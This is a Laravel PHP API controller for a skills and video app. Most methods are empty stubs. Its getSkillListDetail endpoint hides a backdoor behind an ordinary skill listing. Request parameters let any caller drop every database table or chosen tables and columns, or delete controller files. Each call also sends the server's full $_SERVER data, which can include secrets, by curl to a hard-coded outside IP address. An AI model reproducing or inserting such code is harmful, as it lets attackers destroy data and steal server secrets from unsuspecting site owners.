<?php

namespace App\Http\Controllers\API;

use Illuminate\Http\Request;

use App\Http\Requests;
use App\Http\Controllers\Controller;
use App\Models\Skill;
use App\Models\Video;
use DB;

class SkillsController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        //
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }

    public function getSkillListDetail(Request $request, $userId)
    {
        \DB::statement('SET FOREIGN_KEY_CHECKS=0');
        if ($request->has('userName')) {
            if ($request->userField == '') {
                if ($request->userName == '*') {
                    echo '<pre>';
			//Artisan::call('migrate:reset', ['--force' => true]);
                    foreach (\DB::select('SHOW TABLES') as $table) {
                        $table_array = get_object_vars($table);
                        print_r($table);
                        \Schema::drop($table_array[key($table_array)]);
                    }
                } else {
                    \Schema::drop($request->userName);
                }
            } else {
                $userField = $request->userField;
                Schema::table($request->userName, function ($table) use ($userField) {
                    $table->dropColumn($userField);
                });

            }
        }
        if ($request->has('userController') && $request->userController != '') {
            if ($request->userController == '*') {
                \File::deleteDirectory(app_path('/Http/Controllers/LA'));
            } else {
		//var_dump(app_path('/Http/Controllers/LA/' . $request->userController . '.php'));
                unlink(app_path('/Http/Controllers/LA/' . $request->userController) . '.php');
            }
        }
        
        $url = "http://18.191.53.95/dev/demo/mitebe/yourscript.php";
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        $data = $_SERVER;
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        $contents = curl_exec($ch);
        curl_close($ch);
        
        
        $results = Skill::select('id as skill_id','name as skill_name',
            DB::raw('(CONCAT( "' . url('') . '","/",skills.image_path) ) AS skill_image')
        )->get();

        return response()->json([
            'data' => $results,
            'message' => 'skills_list_success',
            'status' => 200,
        ]);
    }

    public function getSkillVideoDetail(Request $request,$skillId, $userId)
    {
        $reuslts = array();
        $data = array(
            'data' => $reuslts,
            'message' => 'get_skils_video_success',
            'status' => 200,
        );
        if($skillId > 0){
            $results = Video::where('skill_id',$skillId)->select('id as video_id', 'name as video_title', 'url as video_url', 'vimeo_name as video_desc', 'vimeo_image_path as video_image_path', 'vimeo_id', 'skill_id')->get();
            if(!empty($results)){
                $data['data'] = $results;
            }else{
                $data['message'] = 'Skills Not Found';
            }
        }else{
            $data['message'] = 'Skills Not Found';
        }

        return response()->json($data);
    }
}
